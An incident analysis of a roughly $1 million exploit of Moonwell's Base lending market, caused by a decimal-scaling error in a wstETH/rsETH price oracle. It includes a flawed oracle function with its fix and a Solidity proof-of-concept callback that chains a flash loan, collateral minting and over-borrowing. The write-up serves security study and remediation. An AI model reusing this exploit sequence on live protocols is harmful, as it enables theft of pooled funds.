# Moonwell — Chainlink Oracle Manipulation Analysis

| Item | Details |
|------|------|
| **Date** | 2025-11-20 |
| **Protocol** | Moonwell |
| **Chain** | Base |
| **Loss** | ~1,000,000 USD |
| **Attacker** | [0x6997a8c804642ae2de16d7b8ff09565a5d5658ff](https://basescan.org/address/0x6997a8c804642ae2de16d7b8ff09565a5d5658ff) |
| **Attack Tx** | [0x190a491c...](https://app.blocksec.com/explorer/tx/base/0x190a491c0ef095d5447d6d813dc8e2ec11a5710e189771c24527393a2beb05ac) |
| **Vulnerable Contract** | Moonwell Lending Market (Base) |
| **Root Cause** | Scaling calculation error in wstETH/rsETH price oracle leading to overvaluation of collateral |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-11/Moonwell_exp.sol) |

---

## 1. Vulnerability Overview

Moonwell's Base chain lending market uses wstETH and rsETH (wrsETH) as collateral, but contained a scaling error in the Chainlink oracle price calculation for these assets. Because collateral value was overestimated relative to its actual worth, attackers were able to borrow far more than the true collateral value warranted. By obtaining large amounts of wstETH and rsETH via flash loans through Velodrome's concentrated liquidity pool (CL Pool), approximately $1 million was drained.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: Oracle price scaling calculation error
function getUnderlyingPrice(address cToken) external view returns (uint256) {
    // Scaling factor is incorrectly applied when computing wstETH price
    // e.g., decimal mismatch in wstETH/ETH ratio * ETH/USD price
    uint256 wstEthToEth = getWstEthRate();  // 1e18 denomination
    uint256 ethToUsd = chainlinkEthUsd.latestAnswer();  // 1e8 denomination
    // ❌ Multiplying the two values directly causes decimal overflow
    return wstEthToEth * ethToUsd; // 1e26 → value far larger than actual
}

// ✅ Fix: Correct decimal normalization
function getUnderlyingPrice(address cToken) external view returns (uint256) {
    uint256 wstEthToEth = getWstEthRate();    // 1e18 denomination
    uint256 ethToUsd = chainlinkEthUsd.latestAnswer(); // 1e8 denomination
    // Correct scaling: normalize result to 1e18
    return wstEthToEth * ethToUsd / 1e8;
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─▶ Flash loan from Velodrome CL Pool
  │         └─ Borrow large amount of wstETH + wrsETH
  │
  ├─[2]─▶ Deposit collateral into Moonwell market
  │         wstETH mint → receive mwstETH
  │         wrsETH mint → receive mwrsETH
  │
  ├─[3]─▶ Comptroller.enterMarkets([mwstETH, mwrsETH])
  │         └─ Register as collateral
  │
  ├─[4]─▶ Over-borrow based on oracle overvaluation
  │         Borrow far more USDC/ETH than actual collateral value
  │
  ├─[5]─▶ Repay flash loan
  │
  └─[6]─▶ Retain ~1,000,000 USD profit
              (borrowed amount - actual collateral value)
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
    require(msg.sender == address(clPoolWstEthWrsEth), "invalid flash caller");

    // [1] Deposit borrowed wstETH into Moonwell
    IERC20(wstETH).approve(address(mWstETH), type(uint256).max);
    ICErc20(mWstETH).mint(wstETHBalance);

    // [2] Deposit borrowed wrsETH into Moonwell
    IERC20(wrsETH).approve(address(mWrsETH), type(uint256).max);
    ICErc20(mWrsETH).mint(wrsETHBalance);

    // [3] Register as collateral in the market
    address[] memory cTokens = new address[](2);
    cTokens[0] = address(mWstETH);
    cTokens[1] = address(mWrsETH);
    IComptroller(comptroller).enterMarkets(cTokens);

    // [4] Over-borrow USDC based on oracle overvaluation
    // Can borrow far more USDC than the actual collateral value
    ICErc20(mUSDC).borrow(borrowAmount);

    // [5] Repay flash loan (wstETH + wrsETH + fees)
    IERC20(wstETH).transfer(address(clPoolWstEthWrsEth), wstETHBalance + fee0);
    IERC20(wrsETH).transfer(address(clPoolWstEthWrsEth), wrsETHBalance + fee1);
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Oracle Price Miscalculation |
| **Attack Vector** | Flash loan + over-borrowing against overvalued collateral |
| **Impact Scope** | Lending market liquidity drain |
| **CWE** | CWE-682: Incorrect Calculation |
| **DASP Classification** | Oracle Manipulation / Price Calculation Error |

## 6. Remediation Recommendations

1. **Standardize oracle price units**: Normalize the decimal precision of all oracle prices consistently.
2. **Price sanity checks**: Add validation to verify that returned prices fall within an expected range.
3. **Multi-oracle usage**: Use a secondary oracle in addition to Chainlink to halt transactions upon detection of price anomalies.
4. **Special handling for lstETH**: Independently audit the price calculation logic for rebasing/staking tokens such as wstETH and wrsETH.

## 7. Lessons Learned

- Decimal precision mismatches in oracle price calculations can silently produce catastrophic results.
- When mixing 1e18 and 1e8 denominations, explicit scaling conversions are strictly required.
- When adding new collateral assets, the oracle integration logic must be audited independently.